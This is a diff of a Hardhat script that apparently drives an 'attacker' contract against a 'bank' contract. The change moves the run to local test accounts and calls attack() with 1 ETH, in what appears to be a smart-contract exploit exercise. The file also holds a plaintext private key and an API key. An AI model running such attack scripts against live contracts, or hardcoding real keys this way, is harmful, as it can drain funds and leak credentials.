@@ -6,11 +6,11 @@
 // global scope, and execute the script.
 const hre = require("hardhat");
 
-let BANK = "0x07CDfA7A454Ef05db08c9C11261A222392EDB696";
-let ATTACKER = "0x48959bd965c11Ff0F9C12Ef0Bb4eAE2bdBe1dB59";
-let ATTACKERCONT = "0x7B83a34b28DDCfBEc7dCC53Dc1C32FF27f987CE5";
+let BANK = "0xAd5d57aD9bB17d34Debb88566ab2F5dB879Cc46F";
+let ATTACKER = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";
+let ATTACKERCONT = "0x663F3ad617193148711d28f5334eE4Ed07016602";
 let PRIVATEKEY =
-	"0xc7e1504b88e4427aa61ca1e3d2bedd49c40b2c051a3288331366ed7100d72989";
+	"0x8d7bf23ad10d0c4d1bdaf9168a7f447bfe9acadba1e7f43f960e30371522fdcf";
 
 let API_KEY = "vZF-bLS5x-6QJAXdpq-LNZ4S2_TZi2_P";
 
@@ -26,17 +26,34 @@ async function main() {
 		API_KEY
 	);
 
+	const provider = new ethers.providers.JsonRpcProvider(
+		"http://127.0.0.1:8545/"
+	);
+
+	// These are Harhdat's deterministic accounts
+	// NEVER SEND REAL FUNDS TO THESE ACCOUNTS!
+	const account0 = new ethers.Wallet(
+		"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
+		provider
+	);
+	const account1 = new ethers.Wallet(
+		"0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
+		provider
+	);
+
 	// Signer
 	const owner = new ethers.Wallet(PRIVATEKEY, alchemyProvider);
+
+	const [ownerattk, addr1] = await ethers.getSigners(); //must use first signer
 
 	// Contract
 	const attackerContract = new ethers.Contract(
 		ATTACKERCONT,
 		contract.abi,
-		owner
+		account1
 	);
 
-	console.log(`${owner.address}`);
+	//console.log(`${owner.address}`);
 	//console.log(JSON.stringify(contract.abi));
 
 	console.log("");
@@ -53,7 +70,7 @@ async function main() {
 	);
 
 	await attackerContract.attack({
-		value: ethers.utils.parseEther("0.000001"),
+		value: ethers.utils.parseEther("1"),
 	});
 
 	console.log("");
